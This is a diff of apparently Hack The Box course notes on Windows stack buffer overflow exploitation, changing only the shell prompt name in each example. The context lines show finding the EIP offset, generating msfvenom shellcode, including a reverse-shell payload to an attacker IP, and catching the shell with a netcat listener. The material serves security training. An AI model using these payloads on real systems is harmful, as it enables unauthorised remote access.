@@ -182,7 +182,7 @@ All of these tools are already installed on the Windows VM found at the end of t
 &#x20; Debugging Windows Programs
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ xfreerdp /v:<target IP address> /u:htb-student /p:<password>
+root@htb[/htb]$ xfreerdp /v:<target IP address> /u:htb-student /p:<password>
 ```
 
 You can also use the same command on your own Linux VM or connect to the Windows VM with RDP on Windows or macOS. To connect to the VM from your machine, you must first connect using the VPN key found at the end of the section. It is also possible to install the tools on your own Windows VM, as shown next.
@@ -375,7 +375,7 @@ We can generate a unique pattern with `pattern_create` either in our `PwnBox` in
 &#x20; Controlling EIP
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ /usr/bin/msf-pattern_create -l 5000
+root@htb[/htb]$ /usr/bin/msf-pattern_create -l 5000
 
 Aa0Aa1Aa2...SNIP...3Gk4Gk5Gk
 ```
@@ -454,7 +454,7 @@ Now we can use the value of `EIP` to calculate the offset. We can once again do 
 &#x20; Controlling EIP
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ /usr/bin/msf-pattern_offset -q 31684630
+root@htb[/htb]$ /usr/bin/msf-pattern_offset -q 31684630
 
 [*] Exact match at offset 4112
 ```
@@ -808,7 +808,7 @@ First, we can list all available payloads for `Windows 32-bit`, as follows:
 &#x20; Jumping to Shellcode
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -l payloads | grep
+root@htb[/htb]$ msfvenom -l payloads | grep
 
 ...SNIP...
     windows/exec                                        Execute an arbitrary command
@@ -823,7 +823,7 @@ For initial testing, let's try `windows/exec` and execute `calc.exe` to open the
 &#x20; Jumping to Shellcode
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
+root@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
 
 ...SNIP...
 buf =  b""
@@ -973,7 +973,7 @@ To do either of these options, all we have to do is change our shellcode to do s
 &#x20; Jumping to Shellcode
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'
+root@htb[/htb]$ msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'
 
 ...SNIP...
 buf =  b""
@@ -987,7 +987,7 @@ If we wanted to get a reverse shell, there are many `msfvenom` payloads we can u
 &#x20; Jumping to Shellcode
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -l payloads | grep windows | grep reverse
+root@htb[/htb]$ msfvenom -l payloads | grep windows | grep reverse
 
 ...SNIP...
     windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker
@@ -1006,7 +1006,7 @@ We can use the `windows/shell_reverse_tcp` payload as follows:
 &#x20; Jumping to Shellcode
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'
+root@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'
 
 ...SNIP...
 buf =  b""
@@ -1321,7 +1321,7 @@ Our final step is to exploit the program, so we'll start by creating our shellco
 &#x20; Building a Remote Exploit
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
+root@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
 
 ...SNIP...
 buf =  b""
@@ -1375,7 +1375,7 @@ First, we need to find our machine's IP, which should be reachable by the remote
 &#x20; Remote Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ip -4 a
+root@htb[/htb]$ ip -4 a
 
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     ...SNIP...
@@ -1396,7 +1396,7 @@ Next, we will generate the shellcode that will send us a reverse shell, which we
 &#x20; Remote Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'
+root@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'
 
 ...SNIP...
 buf =  b""
@@ -1415,7 +1415,7 @@ After that, we can start a `netcat` listener to receive the reverse shell, as fo
 &#x20; Remote Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lvnp 1234
+root@htb[/htb]$ nc -lvnp 1234
 
 listening on [any] 1234 ...
 ```
@@ -1425,7 +1425,7 @@ Once we are listening, we can run our payload with `python win32bof_exploit_remo
 &#x20; Remote Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lvnp 1234
+root@htb[/htb]$ nc -lvnp 1234
 
 listening on [any] 1234 ...
 connect to [10.10.15.10] from (UNKNOWN) [10.10.10.10] 64539
